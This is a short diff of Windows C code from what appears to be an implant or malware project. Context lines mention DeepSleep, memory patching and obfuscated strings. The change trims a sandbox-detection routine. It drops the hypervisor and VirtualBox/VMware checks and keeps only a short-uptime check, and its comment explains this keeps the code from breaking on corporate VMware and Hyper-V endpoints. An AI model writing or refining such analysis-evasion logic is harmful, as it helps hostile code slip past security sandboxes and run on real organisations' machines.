@@ -40,18 +40,10 @@ VOID DeepSleep() {
 
 // ─── Sandbox detection ────────────────────────────────────────────────────────
 static BOOL IsLikelySandbox() {
-    // CPUID hypervisor bit
-    int cpuInfo[4] = {};
-    __cpuid(cpuInfo, 1);
-    if (cpuInfo[2] & (1 << 31)) {
-        ULONGLONG uptimeMs = GetTickCount64();
-        if (uptimeMs < 300000ULL) return TRUE;
-    }
-    // Uptime < 2 min
-    if (GetTickCount64() < 120000ULL) return TRUE;
-    // Check for common sandbox files (VMware, VBox, etc.)
-    if (GetModuleHandleA(XS("vboxguest")) || GetModuleHandleA(XS("vmmemctl"))) return TRUE;
-    return FALSE;
+    // Only flag uptime < 60s — hypervisor bit fires on legitimate corporate
+    // VMware/Hyper-V endpoints and would break most enterprise deployments.
+    // VBox module check removed for same reason: too many false positives.
+    return GetTickCount64() < 60000ULL;
 }
 
 // ─── MemPatch (protect → patch → restore) ────────────────────────────────────
